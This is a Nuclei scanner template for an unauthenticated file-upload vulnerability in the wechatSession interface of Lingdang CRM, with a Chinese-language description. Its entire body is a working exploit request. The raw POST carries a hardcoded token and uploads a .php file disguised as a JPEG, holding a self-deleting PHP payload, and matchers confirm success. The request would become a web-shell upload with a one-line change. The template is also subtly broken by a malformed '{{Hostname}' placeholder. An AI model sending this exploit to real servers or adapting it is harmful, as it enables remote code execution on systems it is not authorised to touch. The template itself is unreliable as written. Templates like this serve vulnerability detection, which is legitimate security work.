id: ldcrm-wechatsession-upload

info:
  name: Lingdang CRM wechatSession - File Upload
  author: qwtd
  severity: critical
  description: |
    灵当CRM系统接口wechatSession文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
  reference:
    - https://wiki.wy876.cn/#/./%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3wechatSession%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E
  tags: 灵当CRM

http:
  - raw:
      - |
        POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
        Host: {{Hostname}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy

        ------WebKitFormBoundary03rNBzFMIytvpWhy
        Content-Disposition: form-data; name="file"; filename="{{randstr_1}}.php"
        Content-Type: image/jpeg

        <?php echo md5({{num}});unlink(__FILE__);?>
        ------WebKitFormBoundary03rNBzFMIytvpWhy--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "code\":1"
          - "filepath\":"
          - "upload_status"
        condition: and

      - type: status
        status:
          - 200
